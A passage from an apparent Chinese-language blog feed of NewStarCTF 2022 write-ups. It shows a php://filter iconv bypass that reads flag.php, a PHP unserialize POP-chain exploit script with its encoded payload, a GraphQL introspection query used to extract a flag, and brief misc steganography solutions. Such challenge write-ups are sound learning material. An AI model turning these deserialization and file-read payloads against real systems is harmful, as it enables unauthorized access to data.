headers=headers, data=data)<br>time.sleep(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;1219893521&lt;br&gt;Baby&quot;</span> <span class="hljs-keyword">in</span> re.text:<br><span class="hljs-built_in">print</span>(i)<br><span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure><p>爆破出当前题目的伪随机数。</p><p>构造payload：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable constant_">GET</span><span class="hljs-symbol">:<span class="hljs-string">?f</span>ile=php</span><span class="hljs-symbol">://filter/read=convert</span>.iconv.<span class="hljs-variable constant_">UCS</span>-2LE.<span class="hljs-variable constant_">UCS</span>-2BE/NewStar/resource=flag.php<br><span class="hljs-variable constant_">POST</span><span class="hljs-symbol">:guess=</span><span class="hljs-number">1202031004</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202209271747905.png" alt="image-20220927174716579"></p><p>base用convert.iconv.UCS-2LE.UCS-2BE绕过，NewStar直接在中间加一个，不影响</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202209271749208.png" alt="image-20220927174908126"></p><p>还需要一步解码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;?&lt;hp p//lfga3&#123;fbe13f-3166c4-04-e58cfc-664c98a4a9&#125;0&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">iconv</span>(<span class="hljs-string">&#x27;UCS-2BE&#x27;</span>, <span class="hljs-string">&#x27;UCS-2LE&#x27;</span>, <span class="hljs-variable">$str</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>即可得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-comment">//flag&#123;3bf1ef33-61c6-440e-85fc-c66c4894a9a0&#125;[Finished in 0.3s]</span><br></code></pre></td></tr></table></figure><h2 id="UnserializeOne"><a href="#UnserializeOne" class="headerlink" title="UnserializeOne"></a>UnserializeOne</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">PHP反序列化漏洞系列第一题<br></code></pre></td></tr></table></figure><p>clone当调用clone方法时触发</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">#Something useful for you : https://zhuanlan.zhihu.com/p/377676274</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$func</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome to NewStarCTF, &quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;func)();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sec</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$var</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;CTFers&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Easy</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cla</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$fun</span>, <span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;cla = <span class="hljs-keyword">clone</span> <span class="hljs-variable">$var</span>[<span class="hljs-number">0</span>];<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">eeee</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__clone</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;obj-&gt;cmd))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;success&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>pop链</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">start</span> __destruct ---&gt;</span>  <span class="hljs-function"><span class="hljs-title">sec</span> __toString ---&gt;</span>  <span class="hljs-function"><span class="hljs-title">easy</span> __call  ---&gt;</span>  <span class="hljs-function"><span class="hljs-title">eeee</span> __clone   ---&gt;</span>   S<span class="hljs-function"><span class="hljs-title">tart</span> __isset  ---&gt;</span>  Sec  __invoke<br></code></pre></td></tr></table></figure><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome to NewStarCTF, &quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;func)();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sec</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;CTFers&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Easy</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cla</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$fun</span>, <span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;cla = <span class="hljs-keyword">clone</span> <span class="hljs-variable">$var</span>[<span class="hljs-number">0</span>];<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">eeee</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__clone</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;obj-&gt;cmd))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;success&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Start</span>();<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Sec</span>();<br><span class="hljs-variable">$b</span>-&gt;name=<span class="hljs-variable">$c</span>;<br><span class="hljs-variable">$d</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Easy</span>();<br><span class="hljs-variable">$c</span>-&gt;obj=<span class="hljs-variable">$d</span>;<br><span class="hljs-variable">$obk</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">eeee</span>();<br><span class="hljs-variable">$haha</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Sec</span>();<br><span class="hljs-variable">$obl</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Start</span>();<br><span class="hljs-variable">$obl</span>-&gt;func=<span class="hljs-variable">$haha</span>;<br><span class="hljs-variable">$obk</span>-&gt;obj=<span class="hljs-variable">$obl</span>;<br><span class="hljs-variable">$c</span>-&gt;<span class="hljs-keyword">var</span>=<span class="hljs-variable">$obk</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>));<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pop</span>=O%<span class="hljs-number">3</span>A5%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Start%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>name%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Sec%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>obj%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Easy%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>cla%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BN%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>var%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>eeee%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>obj%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A5%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Start%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>name%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BN%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>func%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Sec%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>obj%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BN%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>var%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BN%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>func%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BN%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202209271947272.png" alt="image-20220927194728158"></p><h2 id="ezAPI"><a href="#ezAPI" class="headerlink" title="ezAPI"></a>ezAPI</h2><p>发现<a href="http://www.zip/">www.zip</a></p><p>在源码里发现如下语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>]) ? <span class="hljs-variable">$data</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>] : <span class="hljs-variable">$data</span> = <span class="hljs-string">&#x27;&#123;&quot;query&quot;:&quot;query&#123;\nusers_user_by_pk(id:&#x27;</span> . <span class="hljs-variable">$id</span> . <span class="hljs-string">&#x27;) &#123;\nname\n&#125;\n&#125;\n&quot;, &quot;variables&quot;:null&#125;&#x27;</span>;<br></code></pre></td></tr></table></figure><p>得到查询语句</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs wren">&#123;<span class="hljs-string">&quot;query&quot;</span>:<span class="hljs-string">&quot;query&#123;<span class="hljs-char escape_">\n</span>users_user_by_pk(id:&#x27; . $id . &#x27;) &#123;<span class="hljs-char escape_">\n</span>name<span class="hljs-char escape_">\n</span>&#125;<span class="hljs-char escape_">\n</span>&#125;<span class="hljs-char escape_">\n</span>&quot;</span>, <span class="hljs-string">&quot;variables&quot;</span>:<span class="hljs-literal">null</span>&#125;<br></code></pre></td></tr></table></figure><p>传参data试了一下</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-variable">id</span><span class="hljs-operator">=</span><span class="hljs-number">999</span><span class="hljs-operator">&amp;</span><span class="hljs-variable">data</span><span class="hljs-operator">=</span>&#123;<span class="hljs-string">&quot;query&quot;</span>:<span class="hljs-string">&quot;query&#123;<span class="hljs-char escape_">\n</span>users_user_by_pk(id:1)&#123;<span class="hljs-char escape_">\n</span>name<span class="hljs-char escape_">\n</span>&#125;<span class="hljs-char escape_">\n</span>&#125;<span class="hljs-char escape_">\n</span>&quot;</span>,<span class="hljs-string">&quot;variables&quot;</span>:<span class="hljs-literal">null</span>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202209272042008.png" alt="image-20220927204200375"></p><p>搜索graphql得到如下payload（需要整理一下）</p><p><a href="https://www.secpulse.com/archives/148242.html">原文链接</a></p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs wren">&#123;<span class="hljs-string">&quot;query&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-char escape_">\n</span>    query IntrospectionQuery &#123;<span class="hljs-char escape_">\n</span>      __schema &#123;<span class="hljs-char escape_">\n</span>        queryType &#123; name &#125;<span class="hljs-char escape_">\n</span>        mutationType &#123; name &#125;<span class="hljs-char escape_">\n</span>        subscriptionType &#123; name &#125;<span class="hljs-char escape_">\n</span>        types &#123;<span class="hljs-char escape_">\n</span>          ...FullType<span class="hljs-char escape_">\n</span>        &#125;<span class="hljs-char escape_">\n</span>        directives &#123;<span class="hljs-char escape_">\n</span>          name<span class="hljs-char escape_">\n</span>          description<span class="hljs-char escape_">\n</span>          locations<span class="hljs-char escape_">\n</span>          args &#123;<span class="hljs-char escape_">\n</span>            ...InputValue<span class="hljs-char escape_">\n</span>          &#125;<span class="hljs-char escape_">\n</span>        &#125;<span class="hljs-char escape_">\n</span>      &#125;<span class="hljs-char escape_">\n</span>    &#125;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\n</span>    fragment FullType on __Type &#123;<span class="hljs-char escape_">\n</span>      kind<span class="hljs-char escape_">\n</span>      name<span class="hljs-char escape_">\n</span>      description<span class="hljs-char escape_">\n</span>      fields(includeDeprecated: true) &#123;<span class="hljs-char escape_">\n</span>        name<span class="hljs-char escape_">\n</span>        description<span class="hljs-char escape_">\n</span>        args &#123;<span class="hljs-char escape_">\n</span>          ...InputValue<span class="hljs-char escape_">\n</span>        &#125;<span class="hljs-char escape_">\n</span>        type &#123;<span class="hljs-char escape_">\n</span>          ...TypeRef<span class="hljs-char escape_">\n</span>        &#125;<span class="hljs-char escape_">\n</span>        isDeprecated<span class="hljs-char escape_">\n</span>        deprecationReason<span class="hljs-char escape_">\n</span>      &#125;<span class="hljs-char escape_">\n</span>      inputFields &#123;<span class="hljs-char escape_">\n</span>        ...InputValue<span class="hljs-char escape_">\n</span>      &#125;<span class="hljs-char escape_">\n</span>      interfaces &#123;<span class="hljs-char escape_">\n</span>        ...TypeRef<span class="hljs-char escape_">\n</span>      &#125;<span class="hljs-char escape_">\n</span>      enumValues(includeDeprecated: true) &#123;<span class="hljs-char escape_">\n</span>        name<span class="hljs-char escape_">\n</span>        description<span class="hljs-char escape_">\n</span>        isDeprecated<span class="hljs-char escape_">\n</span>        deprecationReason<span class="hljs-char escape_">\n</span>      &#125;<span class="hljs-char escape_">\n</span>      possibleTypes &#123;<span class="hljs-char escape_">\n</span>        ...TypeRef<span class="hljs-char escape_">\n</span>      &#125;<span class="hljs-char escape_">\n</span>    &#125;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\n</span>    fragment InputValue on __InputValue &#123;<span class="hljs-char escape_">\n</span>      name<span class="hljs-char escape_">\n</span>      description<span class="hljs-char escape_">\n</span>      type &#123; ...TypeRef &#125;<span class="hljs-char escape_">\n</span>      defaultValue<span class="hljs-char escape_">\n</span>    &#125;<span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\n</span>    fragment TypeRef on __Type &#123;<span class="hljs-char escape_">\n</span>      kind<span class="hljs-char escape_">\n</span>      name<span class="hljs-char escape_">\n</span>      ofType &#123;<span class="hljs-char escape_">\n</span>        kind<span class="hljs-char escape_">\n</span>        name<span class="hljs-char escape_">\n</span>        ofType &#123;<span class="hljs-char escape_">\n</span>          kind<span class="hljs-char escape_">\n</span>          name<span class="hljs-char escape_">\n</span>          ofType &#123;<span class="hljs-char escape_">\n</span>            kind<span class="hljs-char escape_">\n</span>            name<span class="hljs-char escape_">\n</span>            ofType &#123;<span class="hljs-char escape_">\n</span>              kind<span class="hljs-char escape_">\n</span>              name<span class="hljs-char escape_">\n</span>              ofType &#123;<span class="hljs-char escape_">\n</span>                kind<span class="hljs-char escape_">\n</span>                name<span class="hljs-char escape_">\n</span>                ofType &#123;<span class="hljs-char escape_">\n</span>                  kind<span class="hljs-char escape_">\n</span>                  name<span class="hljs-char escape_">\n</span>                  ofType &#123;<span class="hljs-char escape_">\n</span>                    kind<span class="hljs-char escape_">\n</span>                    name<span class="hljs-char escape_">\n</span>                  &#125;<span class="hljs-char escape_">\n</span>                &#125;<span class="hljs-char escape_">\n</span>              &#125;<span class="hljs-char escape_">\n</span>            &#125;<span class="hljs-char escape_">\n</span>          &#125;<span class="hljs-char escape_">\n</span>        &#125;<span class="hljs-char escape_">\n</span>      &#125;<span class="hljs-char escape_">\n</span>    &#125;<span class="hljs-char escape_">\n</span>&quot;</span>,<span class="hljs-string">&quot;variables&quot;</span>:<span class="hljs-literal">null</span>&#125;<br></code></pre></td></tr></table></figure><p>试了一下，成功查到数据</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202209272043180.png" alt="image-20220927204319445"></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">ffffllllaaagggg_<span class="hljs-number">1</span><span class="hljs-symbol">n_h3</span>r<span class="hljs-number">3.</span>flag<br></code></pre></td></tr></table></figure><p>接着用她的接口查flag，构造了几次发现没有id这个参数</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-variable">id</span><span class="hljs-operator">=</span><span class="hljs-number">9</span><span class="hljs-operator">&amp;</span><span class="hljs-variable">data</span><span class="hljs-operator">=</span>&#123;<span class="hljs-string">&quot;query&quot;</span>:<span class="hljs-string">&quot;query&#123;<span class="hljs-char escape_">\n</span>ffffllllaaagggg_1n_h3r3_flag&#123;<span class="hljs-char escape_">\n</span>flag<span class="hljs-char escape_">\n</span>&#125;<span class="hljs-char escape_">\n</span>&#125;<span class="hljs-char escape_">\n</span>&quot;</span>,<span class="hljs-string">&quot;variables&quot;</span>:<span class="hljs-literal">null</span>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202209272046789.png" alt="image-20220927204623722"></p><h1 id="misc第一周"><a href="#misc第一周" class="headerlink" title="misc第一周"></a>misc第一周</h1><p>misc也就第一周了，第二周不太想写，没有耐心，拼图和修Aztec Code太麻烦了。。（这玩意儿的纠错级别太多了，级别越高容错率越低），突然不喜欢misc了，好在也就偶尔玩玩。</p><h2 id="Look-my-eyes"><a href="#Look-my-eyes" class="headerlink" title="Look my eyes"></a>Look my eyes</h2><p>silenteye打开decode即可。</p><h2 id="qsdzs-girlfriend"><a href="#qsdzs-girlfriend" class="headerlink" title="qsdzs_girlfriend"></a>qsdzs_girlfriend</h2><p>压缩包爆破生日得到20031201</p><p>再百度识图，搜人物名称。</p><h2 id="奇怪的音频"><a href="#奇怪的音频" class="headerlink" title="奇怪的音频"></a>奇怪的音频</h2><p>SSTV，使用sstv解密工具就可以得到flag图片。</p><h2 id="Yesec-no-drumsticks"><a href="#Yesec-no-drumsticks" class="headerlink" title="Yesec_no_drumsticks"></a>Yesec_no_drumsticks</h2><p>lsb隐写，zsteg检测得到flag。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">zsteg -<span class="hljs-selector-tag">a</span> xx<span class="hljs-selector-class">.png</span><br></code></pre></td></tr></table></figure><h2 id="EzSnake"><a href="#EzSnake" class="headerlink" title="EzSnake"></a>EzSnake</h2><p>用cheat engine，修改score即可</p>]]></content>
    
    
    <categories>
      
      <category>writeup</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>NewStar</tag>
      
      <tag>2022</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHPSTORM配置debug的坑点</title>
    <link href="/2022/09/25/PHPSTORM%E9%85%8D%E7%BD%AEdebug%E7%9A%84%E5%9D%91%E7%82%B9/"/>
    <url>/2022/09/25/PHPSTORM%E9%85%8D%E7%BD%AEdebug%E7%9A%84%E5%9D%91%E7%82%B9/</url>
    
